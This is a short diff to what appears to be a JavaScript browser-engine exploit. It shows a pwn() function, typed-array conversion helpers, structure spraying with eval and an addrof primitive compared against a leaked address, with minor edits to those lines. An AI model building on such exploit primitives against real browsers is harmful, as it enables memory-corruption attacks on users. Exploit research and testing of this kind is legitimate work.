@@ -1,6 +1,7 @@
 <script src=“utils.js”>
 <script>
-let print = alert;
+//let print = alert;
+var ALLOCS = 1000
 let convert = new ArrayBuffer(0x8);
 let f64 = new Float64Array(convert);
 let u32 = new Uint32Array(convert);
@@ -257,7 +258,7 @@ function pwn() {
                 structure_spray.push(eval(expr))
             }
             res = eval(expr)
-        } while (stage1.addrof(res) < leak_addr)
+        } while (addrof(res) < leak_addr)
         return res
     }
 
